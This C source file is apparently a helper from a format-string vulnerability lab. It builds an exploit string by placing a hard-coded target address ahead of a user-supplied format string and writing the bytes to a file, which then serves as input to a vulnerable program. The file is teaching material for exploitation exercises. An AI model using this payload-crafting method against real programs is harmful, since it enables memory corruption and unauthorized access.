/* write_string.c */
#include <sys/types.h>


#include <sys/stat.h>
#include <fcntl.h>

int main() {
  char buf[1000];
  int fp, size;
  unsigned int *address;

/* Putting any number you like at the beginning of the format string */
  address = (unsigned int *) buf;

/* This is the address of the second secret number we want we want 
 * scanf to accept before reading the rest of our exploit string.
 * This is not necessary if there is a scanf reading an int before
 * reading the beffer because we can put this value in at that time.
 */
  *address = 0x804b054;

/* Getting the rest of the format string */
  scanf("%s", buf+4);
  size = strlen(buf+4) + 4;
  printf("The string length is %d\n", size);
/* Writing buf to "mystring" */
  fp = open("mystring", O_RDWR | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR);
  if (fp != -1) {
    write(fp, buf, size);
    close(fp);
  } 
  else {
    printf("Open failed!\n");
  }
}

